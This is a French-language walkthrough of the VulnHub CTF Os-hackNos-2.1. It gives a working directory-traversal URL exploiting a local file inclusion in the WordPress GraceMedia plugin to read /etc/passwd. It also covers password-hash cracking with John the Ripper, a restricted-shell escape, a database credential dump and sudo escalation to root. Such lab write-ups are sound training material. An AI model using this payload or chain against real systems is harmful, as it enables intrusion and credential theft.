---
title: "Solution du CTF hackNos: Os-hackNos-2.1 de VulnHub"
tags: [CTF,VulnHub]
---

[hackNos: Os-hackNos-2.1](https://vulnhub.com/entry/hacknos-os-hacknos-21,403/) est un CTF créé par [Rahul Gehlaut](https://twitter.com/rahul_gehlaut) et disponible sur *VulnHub*.

## LFI made easy

`Nmap` a la bonté de nous trouver un dossier intéressant sur le serveur web :

```
Nmap scan report for 192.168.56.220
Host is up (0.00055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /tsweb/: Remote Desktop Web Connection
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Contrairelent à ce qu'on pourrait immaginer on y trouve un Wordpress.

Un petit coup d'œil au code source montre l'utilisation d'un plugin :

```html
<script type='text/javascript' src='http://192.168.56.220/tsweb/wp-content/plugins/gracemedia-media-player/jwplayer/jwplayer.html5.js?ver=5.3'></script>
<script type='text/javascript' src='http://192.168.56.220/tsweb/wp-content/plugins/gracemedia-media-player/jwplayer/jwplayer.js?ver=5.3'></script>
```

Une faille d'inclusion existe pour ce plugin :

[WordPress Plugin GraceMedia Media Player 1.0 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/46537)

On essaye aussitôt de lire `/etc/passwd` et le résultat dépasse nos espérances :

```
http://192.168.56.220/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

On trouve en effet un hash dans le fichier :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
```

`JtR` trouve rapidement le mot de passe correspondant :

```console
$ john hashes.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 30 candidates buffered for the current salt, minimum 48 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:./password.lst
Enabling duplicate candidate password suppressor
topsecret        (flag)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Les plus attentifs auront remarqué que l'utilisateur `flag` a son shell défini à `rshell` donc un shell restreint.

Les restrictions semblent assez légères, j'ai juste lancé `sh`, écrasé la variable `SHELL` et relancé `bash` :

```console
flag@hacknos:/$ export SHELL=/bin/bash
-rbash: SHELL: readonly variable
flag@hacknos:/$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
flag@hacknos:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
flag@hacknos:/$ sh
$ export SHELL=/bin/bash
$ bash
flag@hacknos:/$ env
SSH_CONNECTION=192.168.56.1 58684 192.168.56.220 22
LANG=en_US.UTF-8
XDG_SESSION_ID=1
USER=flag
PWD=/
HOME=/home/flag
SSH_CLIENT=192.168.56.1 58684 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/flag
SHELL=/bin/bash
TERM=xterm-256color
SHLVL=2
LOGNAME=flag
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
_=/usr/bin/env
```

J'ai ensuite récupéré les identifiants de BDD dans la config Wordpress et dumpé la table des utilisateurs :

```sql
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | user       | $P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |
+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

Le hash ne semblant pas se casser, j'ai fouillé dans le système, notamment dans `/var/backups` :

```console
flag@hacknos:/var/backups$ ls passbkp/
total 12K
drwxr-xr-x 2 root root 4.0K Nov 17  2019 .
drwxr-xr-x 3 root root 4.0K May 29 09:51 ..
-rw-r--r-- 1 root root   32 Nov 17  2019 md5-hash
flag@hacknos:/var/backups$ cat passbkp/md5-hash 
$1$rohit$01Dl0NQKtgfeL08fGrggi0
```

Ce hash se casse avec `rockyou`, il s'agit du clair `!%hack41`.

À partir du compte `rohit` on peut alors passer `root` :

```console
flag@hacknos:/tmp$ su rohit
Password: 
rohit@hacknos:/tmp$ sudo -l
[sudo] password for rohit: 
Matching Defaults entries for rohit on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rohit may run the following commands on hacknos:
    (ALL : ALL) ALL
rohit@hacknos:/tmp$ sudo su
root@hacknos:/tmp# cd /root
root@hacknos:~# ls
root.txt
root@hacknos:~# cat root.txt 
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  # 
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################                                                          
                                                          
#############################################################                                                          
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Blog : www.hackNos.com

Author : Rahul Gehlaut

linkedin : https://www.linkedin.com/in/rahulgehlaut/
#############################################################
```
